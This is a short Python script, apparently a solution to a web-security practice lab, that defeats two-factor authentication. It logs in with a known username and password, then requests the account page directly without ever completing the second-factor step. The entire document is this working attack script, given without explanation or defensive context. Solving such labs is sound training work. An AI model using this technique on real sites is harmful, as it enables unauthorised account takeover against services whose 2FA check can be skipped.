import requests

LAB_URL = input("Enter the lab URL: ")

def bypass_2fa(lab_url):
    s = requests.Session()
    login_url = f"{lab_url}/login"
    data = {
        "username":"carlos",
        "password":"montoya"
    }

    s.post(login_url, data=data)

    r = s.get(f"{lab_url}/my-account?id=carlos")
    print(r.text)

if __name__ == "__main__":
    bypass_2fa(LAB_URL)
    